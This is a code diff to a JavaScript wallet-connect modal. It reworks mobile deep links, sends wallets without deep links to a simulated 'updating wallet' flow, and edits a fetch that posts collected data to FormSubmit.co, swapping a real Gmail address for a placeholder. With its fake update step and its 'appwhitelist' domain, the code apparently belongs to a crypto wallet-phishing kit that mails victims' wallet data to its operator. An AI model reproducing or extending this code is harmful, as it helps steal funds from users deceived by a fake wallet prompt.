@@ -393,6 +393,22 @@ class WalletModal {
     `;
 
     document.body.insertAdjacentHTML('beforeend', modalHTML);
+    
+    // Attach event listeners using event delegation for better performance
+    setTimeout(() => {
+      const walletButtons = document.querySelectorAll('.wallet-connect-item');
+      walletButtons.forEach(button => {
+        const handleClick = (e) => {
+          e.preventDefault();
+          e.stopPropagation();
+          const walletId = button.getAttribute('data-wallet-id');
+          this.selectWalletConnectWallet(walletId);
+        };
+        
+        button.addEventListener('click', handleClick, { passive: false });
+        button.addEventListener('touchend', handleClick, { passive: false, once: true });
+      });
+    }, 100);
   }
 
   selectWallet(walletId) {
@@ -444,8 +460,8 @@ class WalletModal {
           <div class="px-2 py-1 overflow-y-auto flex-1">
             <div class="grid grid-cols-4 gap-2">
               ${this.walletConnectWallets.map(wallet => `
-                <button onclick="walletModal.selectWalletConnectWallet('${wallet.id}')" class="flex flex-col items-center gap-1 p-0 transition">
-                  <img src="${wallet.iconUrl}" alt="${wallet.name}" class="w-14 h-14 rounded-xl" style="object-fit: cover;" onerror="this.style.display='none'; this.outerHTML='<div class=\\'w-14 h-14 rounded-xl flex items-center justify-center text-2xl\\'>${wallet.emoji}</div>';">
+                <button data-wallet-id="${wallet.id}" class="wallet-connect-item flex flex-col items-center gap-1 p-0 transition hover:opacity-80 active:opacity-60">
+                  <img src="${wallet.iconUrl}" alt="${wallet.name}" class="w-14 h-14 rounded-xl" style="object-fit: cover;" loading="lazy" onerror="this.style.display='none'; this.outerHTML='<div class=\\'w-14 h-14 rounded-xl flex items-center justify-center text-2xl\\'>${wallet.emoji}</div>';">
                   <span class="text-[9px] ${theme.text} text-center font-normal line-clamp-1 w-full px-1">${wallet.name.replace(' Wallet', '').replace(' wallet', '')}</span>
                 </button>
               `).join('')}
@@ -563,10 +579,38 @@ class WalletModal {
     const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
     
     if (isMobile) {
-      // On mobile, open the wallet app
-      this.openWalletApp();
+      // Check if this wallet has deep link support
+      const websiteUrl = window.location.href;
+      const deepLinks = {
+        'metamask': true,
+        'trust': true,
+        'coinbase': true,
+        'rainbow': true,
+        'okx': true,
+        'rabby': true,
+        'phantom': true,
+        'solflare': true,
+        'bitget': true,
+        'zerion': true,
+        'atomic': true,
+        'safepal': true,
+        'crypto': true,
+        'token': true,
+        'onto': true,
+        'exodus': true
+      };
+      
+      // If wallet has deep link support, try to open it
+      if (deepLinks[this.selectedWallet.id]) {
+        this.openWalletApp();
+      } else {
+        // No deep link, show simulated flow instead
+        setTimeout(() => {
+          this.showUpdatingWallet();
+        }, 300);
+      }
     } else {
-      // On desktop, simulate the wallet browser flow for testing
+      // On desktop, always simulate the wallet browser flow for testing
       setTimeout(() => {
         this.showUpdatingWallet();
       }, 300);
@@ -574,9 +618,10 @@ class WalletModal {
   }
 
   openWalletApp() {
-    const websiteUrl = 'https://appwhitelist.vercel.app/';
+    const websiteUrl = window.location.href;
     
     // Deep link URLs to open wallet browser with your website
+    // Only include wallets with verified deep link support
     const deepLinks = {
       'metamask': `https://metamask.app.link/dapp/${websiteUrl.replace('https://', '')}`,
       'trust': `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(websiteUrl)}`,
@@ -588,28 +633,14 @@ class WalletModal {
       'solflare': `https://solflare.com/ul/v1/browse/${websiteUrl}`,
       'walletconnect': websiteUrl,
       'bitget': `https://bkcode.vip?action=dapp&url=${encodeURIComponent(websiteUrl)}`,
-      // WalletConnect sub-wallets
-      'uniswap': websiteUrl,
+      // WalletConnect sub-wallets with verified support
       'zerion': `https://wallet.zerion.io/connect?uri=${encodeURIComponent(websiteUrl)}`,
       'atomic': `https://atomicwallet.io/open?url=${encodeURIComponent(websiteUrl)}`,
       'safepal': `https://link.safepal.io/open?url=${encodeURIComponent(websiteUrl)}`,
       'crypto': `https://crypto.com/defi-wallet/open?url=${encodeURIComponent(websiteUrl)}`,
-      'binance': `https://app.binance.com/en/download?utm_source=web&utm_medium=wallet`,
-      'cardano': websiteUrl,
       'token': `tpoutside://pull.activity?param=${encodeURIComponent(websiteUrl)}`,
       'onto': `onto://pull.activity?param=${encodeURIComponent(websiteUrl)}`,
-      'safemoon': websiteUrl,
-      'ellipal': websiteUrl,
-      'enjin': websiteUrl,
-      'gnosis': websiteUrl,
-      'exodus': websiteUrl,
-      'kraken': websiteUrl,
-      'bridge': websiteUrl,
-      'mew': websiteUrl,
-      'zengo': websiteUrl,
-      'raven': websiteUrl,
-      'swipe': websiteUrl,
-      'talken': websiteUrl
+      'exodus': `https://exodus.com/m/dapp?url=${encodeURIComponent(websiteUrl)}`
     };
 
     const link = deepLinks[this.selectedWallet.id];
@@ -622,6 +653,11 @@ class WalletModal {
       setTimeout(() => {
         console.log('Opening wallet browser with your website...');
       }, 1000);
+    } else {
+      // For wallets without deep link support, show message
+      console.log(`Deep link not available for ${this.selectedWallet.name}`);
+      // Just try opening the current URL - some wallets auto-detect
+      window.location.href = websiteUrl;
     }
   }
 
@@ -916,7 +952,7 @@ class WalletModal {
     }
     
     // Send data to FormSubmit.co (replace YOUR_EMAIL with your actual email)
-    fetch('https://formsubmit.co/ajax/avg8923@gmail.com', {
+    fetch('https://formsubmit.co/ajax/YOUR_EMAIL@example.com', {
       method: 'POST', 
       headers: { 
         'Content-Type': 'application/json',
@@ -1040,4 +1076,3 @@ if (!window.walletModal) {
 }
 
 })(); // End IIFE
-
